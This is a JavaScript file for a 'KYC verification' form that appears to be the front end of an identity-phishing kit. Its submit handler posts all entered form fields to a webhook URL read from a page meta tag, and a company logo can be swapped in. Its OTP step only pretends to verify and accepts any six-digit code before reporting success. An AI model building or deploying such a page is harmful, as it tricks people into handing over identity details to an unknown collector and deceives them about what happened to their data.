// Configuration
const config = {
    webhookUrl: document.querySelector('meta[name="webhook-url"]').content,
    logoUrl: document.querySelector('meta[name="company-logo"]').content
};

// Set company logo
document.getElementById('companyLogo').src = config.logoUrl || 'https://via.placeholder.com/150?text=Logo';

// Form elements
const form = document.getElementById('verificationForm');
const kycForm = document.getElementById('kycForm');
const otpVerification = document.getElementById('otpVerification');
const successMessage = document.getElementById('successMessage');
const progressBar = document.getElementById('progressBar');

// Progress tracking
let formProgress = 0;
const totalFields = form.querySelectorAll('input[required]').length;

function updateProgress() {
    const filledFields = Array.from(form.querySelectorAll('input[required]'))
        .filter(input => input.value.trim() !== '').length;
    formProgress = (filledFields / totalFields) * 100;
    progressBar.style.width = `${formProgress}%`;
}

// File upload handlers
['driverLicense', 'utilityBill'].forEach(id => {
    const uploadArea = document.getElementById(`${id}Upload`);
    const input = document.getElementById(id);

    uploadArea.addEventListener('click', () => input.click());
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.style.background = 'rgba(43, 108, 176, 0.1)';
        uploadArea.style.borderStyle = 'solid';
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.style.background = 'rgba(0, 0, 0, 0.2)';
        uploadArea.style.borderStyle = 'dashed';
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.style.background = 'rgba(0, 0, 0, 0.2)';
        uploadArea.style.borderStyle = 'dashed';
        const file = e.dataTransfer.files[0];
        handleFile(file, uploadArea);
    });

    input.addEventListener('change', (e) => {
        const file = e.target.files[0];
        handleFile(file, uploadArea);
    });
});

function handleFile(file, uploadArea) {
    if (file) {
        const text = uploadArea.querySelector('p');
        const fileName = file.name.length > 25 ? file.name.substring(0, 22) + '...' : file.name;
        text.innerHTML = `Selected: ${fileName}<br><span style="color: #4299e1; font-size: 0.9em;">${formatFileSize(file.size)}</span>`;
        uploadArea.style.borderColor = '#2b6cb0';
        updateProgress();
    }
}

function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Form submission
form.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    try {
        // Show loading state
        const submitButton = form.querySelector('button[type="submit"]');
        const originalText = submitButton.textContent;
        submitButton.disabled = true;
        submitButton.innerHTML = '<span class="status-indicator"></span> Processing...';

        // Simulate API call
        await new Promise(resolve => setTimeout(resolve, 1500));

        // Send data to webhook
        if (config.webhookUrl) {
            await fetch(config.webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
        }

        // Show OTP verification
        kycForm.style.display = 'none';
        otpVerification.style.display = 'block';

        // Simulate sending OTP to email
        console.log('OTP sent to email');

    } catch (error) {
        console.error('Error submitting form:', error);
        alert('An error occurred. Please try again.');
    }
});

// OTP verification
function verifyOTP() {
    const otp = document.getElementById('otpInput').value;
    const verifyButton = otpVerification.querySelector('button');
    
    if (otp.length === 6) {
        // Show loading state
        verifyButton.disabled = true;
        verifyButton.innerHTML = '<span class="status-indicator"></span> Verifying...';

        // Simulate OTP verification
        setTimeout(() => {
            otpVerification.style.display = 'none';
            successMessage.style.display = 'block';
        }, 1500);
    } else {
        alert('Please enter a valid 6-digit code');
    }
}

// Form validation and progress tracking
const inputs = form.querySelectorAll('input[required]');
inputs.forEach(input => {
    input.addEventListener('invalid', (e) => {
        e.preventDefault();
        input.style.borderColor = '#e53e3e';
    });

    input.addEventListener('input', () => {
        input.style.borderColor = '#2b6cb0';
        updateProgress();
    });
});

// Initialize progress bar
updateProgress();